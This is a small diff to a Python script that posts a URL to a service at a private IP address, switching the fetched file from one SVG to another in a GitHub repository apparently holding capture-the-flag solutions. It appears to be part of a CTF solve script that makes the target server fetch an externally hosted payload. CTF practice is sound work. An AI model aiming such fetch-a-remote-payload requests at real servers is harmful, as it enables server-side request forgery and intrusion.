@@ -2,7 +2,7 @@ import requests
 
 url = "http://192.168.64.2:5000/fetch"
 payload = {
-    "url": "https://raw.githubusercontent.com/Ilyeshaddad337/nexusctf/refs/heads/main/sol3.svg"
+    "url": "https://raw.githubusercontent.com/Ilyeshaddad337/nexusctf/refs/heads/main/sol5.svg"
 }
 headers = {
     "Content-Type": "application/x-www-form-urlencoded"
